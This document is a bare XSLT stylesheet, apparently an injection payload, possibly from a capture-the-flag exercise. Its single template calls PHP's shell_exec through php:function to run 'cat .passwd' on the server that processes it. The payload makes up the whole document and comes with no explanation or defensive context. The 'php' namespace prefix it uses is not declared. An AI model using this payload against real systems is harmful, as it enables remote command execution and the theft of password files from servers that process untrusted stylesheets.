<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="php:function('shell_exec','cat .passwd')"/>
  </xsl:template>
</xsl:stylesheet> 

